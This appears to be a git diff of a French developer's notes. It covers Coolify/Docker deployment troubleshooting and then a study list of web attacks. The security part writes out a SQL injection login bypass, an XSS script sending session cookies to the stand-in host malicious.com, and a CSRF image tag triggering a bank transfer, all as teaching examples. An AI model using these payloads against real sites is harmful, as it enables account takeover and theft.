@@ -1,3 +1,19 @@
+sommaire :
+
+1. deploiement
+1.1. historique des actions et pbm rencontrés
+1.2. liste des problemes et de leur resolution
+1.2.1. pbm 1 et 2 **volumes** et **sync github**
+1.2.2. pbm 3 **psql/**
+1.2.3. pbm 4 **ports**
+1.2.4. pbm 5 **.env**
+1.2.5. pbm 6 **dist/**
+1.2.6. pbm 7 **bdd sync & seed**
+2. securité
+2.1 types de failles de securité
+
+---
+
 # deploiement :
 
 ### historique des actions et pbm rencontrés
@@ -46,6 +62,10 @@
 	- je les enleve de git
 - **erreur :**
 	- on à perdu les donnees de la base de donnee, je vais automatiser leur seeding
+- **erreur :**
+	- les requetes n'aboutissent pas, ca pourrait etre les ports
+	- effectivement, j'ai mal géré les variables .env quand je les aient toutes mises dans le compose file
+- ça marche !
 
 
 
@@ -53,13 +73,13 @@
 
 - resoudre les pbm que recontre coolify pour le deploiement :
 	1. **volumes :** il creer des dossier ./BACK/db/migration.sql/ et ./BACK/db/seeding.sql/ au lieu de fichiers, parce qu'il les voit dans le docker-compose.yml en tant que "bind mount files" et il croit que ce sont des volumes, puis il ne parvient pas a les remplacer par les fichiers quand il synchronise avec github
-	3. **psql/ :** ensuite il n'arrive pas toujours a creer la base de donnee, parce qu'il a copié le dossier psql depuis github donc il saute l'etape de recreer la base de donnee, et il lui manque des choses
-	4. **ports :** à ce stade, le site s'affiche, mais pas toujours sur le meme port, c'est encore mysterieux
-	5. **.env :** ensuite il n'a pas les variables d'environnement pour les fetchs
-	6. **dist/ :** parfois les fetchs sont fait sur l'url trouvee dans la variable d'env, et d'autres fois sur localhost, à cause du dossier dist/
-	7. **bdd sync & seed :** à un moment il y a le pbm de la base de donnee qui doit etre cree en 2 etapes en de-commentant des lignes, je ne sais pas encore comment resoudre ca
+	2. **psql/ :** ensuite il n'arrive pas toujours a creer la base de donnee, parce qu'il a copié le dossier psql depuis github donc il saute l'etape de recreer la base de donnee, et il lui manque des choses
+	3. **.env :** ensuite il n'a pas les variables d'environnement pour les fetchs
+	4. **dist/ :** parfois les fetchs sont fait sur l'url trouvee dans la variable d'env, et d'autres fois sur localhost, à cause du dossier dist/
+	5. **bdd sync & seed :** à un moment il y a le pbm de la base de donnee qui doit etre cree en 2 etapes en de-commentant des lignes, je ne sais pas encore comment resoudre ca
+	6. **ports :** à ce stade, le site s'affiche mais il ne recupere pas les donnees du back
 
-#### pbm 1 et 2 **volumes** et **sync github** :
+#### pbm 1 **volumes** et **sync github** :
 
 - dans le docker-compose.yml, au lieu d'avoir 2 fichier "bind mount", on va mettre un volume qui contient les 2 fichiers :
 	- avant :
@@ -76,7 +96,7 @@
 - aussi on change le nom de `migration.sql` pour `create_tables.sql` puisqu'il doit s'appeller comme ca dans le container
 - ok
 
-#### pbm 3 **psql/** :
+#### pbm 2 **psql/** :
 
 - on a tout simplement pas besoin de synchroniser le dossier psql dans github
 	- donc on l'enleve de github : `git rm -r psql/`
@@ -84,9 +104,7 @@
 - la base de donnee se recreer correctement si on deploi
 - ok
 
-#### pbm 4 **ports** : ?
-
-#### pbm 5 **.env** :
+#### pbm 3 **.env** :
 
 - pour l'instant chaque dossier FRONT et BACK possede son fichier .env avec ses variables d'environnements
 - mais coolify ne nous laisse pas creer des variables d'environnement localisées dans tel ou tel fichier (à ma connaissance)
@@ -128,13 +146,13 @@
 - il ne reste plus qu'à les rentrer dans coolify avant de deployer
 - ok
 
-#### pbm 6 **dist/** :
+#### pbm 4 **dist/** :
 
 - en fait react cree des fichiers dans le dossier dist/ qui ont ete envoyé sur github
 - ils ne sont du coup pas bien recrees dans le server
 - il suffit de les enlever de git et github avec une regle dans .gitignore
 
-#### pbm 7 **bdd sync & seed** :
+#### pbm 5 **bdd sync & seed** :
 
 - je vais simplement comparer la bdd avant et apres sync, pour voir un critere que je pourrais utiliser pour savoir si elle a deja ete sync :
 	```
@@ -156,6 +174,12 @@
 	```
 - on peut utiliser la presence de la colonne "status" dans la table meeting par exemple
 
+#### pbm 6 **ports** :
+
+- les ports n'etaient pas bien mis dans les variables .env
+- ex: le port `REACT_APP_URL` n'etait pas le meme que le `PORT_FRONT` alors qu'en fait c'est le meme
+- j'ai un peu ordonné toutes les variables d'environnement pour eviter des doublons et des melanges
+
 
 ---
 
@@ -165,36 +189,51 @@
 
 1. **injection SQL**
    injecter une requete sql "malveillante", qui fait fonctionner la base de donnee d'une maniere imprevue
-	 ex de requete avec 2 champs de formulaire pour se connecter 'username' et 'password' :
+	 ex d'injection sur une page de connexion :
+	 1. la page a 2 champs de formulaire pour se connecter 'username' et 'password' :
 	    "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
-			si on remplis uniquement le 'username' avec [' OR '1'='1], ca donne cette requete :
+   2. si on remplis uniquement le 'username' avec [' OR '1'='1], ca donne cette requete :
 			SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
 			1=1 est toujours vraie donc on peut se connecter avec n'importe username sans le mot de passe
 2. **xss**
+   Cross-Site Scripting
    injecter du code "malveillant" sur une page vue par un autre utilisateur, par exemple pour recuperer ses cookies de session
    ex d'attaque xss sur un site web qui permet de faire une recherche :
-	    1. le site possede une page avec un champ de recherche, on peut chercher "babar" par exemple :
-			   `recherche: [babar]`
-			2. lorsqu'on valide la recherche, elle est envoyé avec la methode GET au back :
-			   `https://exemple.com/search?query=babar`
-			3. le site affiche ensuite la recherche en plus des resultats :
-				 `les resultats pour votre recherche "babar" sont etc...`
-			4. donc si on envoit cette url à quelqu'un, il va voir les resultats s'afficher :
-			   `https://exemple.com/search?query=babar`
-				 `les resultats pour votre recherche "babar" sont etc...`
-			5. au lieu d'envoyer "babar" dans le champs de recherche, on peut y mettre un script :
-			   [<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>]
-				 les resultats pour votre recherche <script>...</script>
-				 -> le script est executé
-				 en l'occurence, il vole les cookies de session de la personne, on peut donc ensuite se connecter a son compte
+	 1. le site possede une page avec un champ de recherche, on peut chercher "babar" par exemple :
+			`recherche: [babar]`
+   2. lorsqu'on valide la recherche, elle est envoyé avec la methode GET au back :
+			`https://exemple.com/search?query=babar`
+   3. le site affiche ensuite la recherche en plus des resultats :
+	    `les resultats pour votre recherche "babar" sont etc...`
+   4. donc si on envoit cette url à quelqu'un, il va voir les resultats s'afficher :
+	    `https://exemple.com/search?query=babar`
+			`les resultats pour votre recherche "babar" sont etc...`
+   5. au lieu d'envoyer "babar" dans le champs de recherche de l'url, on peut y mettre un script, il s'executera dans le front :
+		  [<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>]
+			les resultats pour votre recherche <script>...</script>
+			-> le script est executé
+			en l'occurence, il vole les cookies de session de la personne et les envois a l'adresse "http://malicious.com/steal", on peut donc ensuite se connecter a son compte
 3. **csrf**
-   
+   Cross-Site Request Forgery
+	 amener une personne à executer une action non-desiree sur un site web sur lequel elle est connectée, sans s'en rendre compte
+	 ex d'attaque pour recevoir un virement d'une personne :
+	 1. une personne est connectée à sa banque en ligne
+	 2. elle recoit un email de l'attaquant avec une image
+	 3. le code de l'image contient en fait une url de transfert de sa banque :
+	    `<img src="http://yourbank.com/transfer?amount=1000&to=attacker_account" />`
+   4. comme la personne est connectee en ce moment meme à sa banque, celle-ci effectue le virement sans avertir (banque bien pourrave)
 4. **brute force**
-   
+   cette attaque consiste à essayer toutes les combinaisons possibles d'un mot de passe, jusqu'a tomber sur le bon
+	 c'est une attaque simple à code donc pleins de petits robots parcours internet pour essayer automatiquement sur les sites webs
+	 elle est souvent ameliorée en utilisant des dictionnaires, pour cherche en priorité les mots de passes les plus utilisés
 5. **man in the middle**
-   
+   une personne arrive à se placer sur le reseau entre votre ordinateur et le site web que vous visitez
+	 elle peut alors modifier, et peut-etre meme decripter, tous ce que vous envoyez et recevez
+	 ca peut servir à voler des cookies de sessions,
+	 voir vos mots de passes ou informations sensibles,
+	 ajouter du code malveillant dans vos echanges
 6. **ddos**
    
 7. **idor**
   
-api abuse
+8. **api abuse**
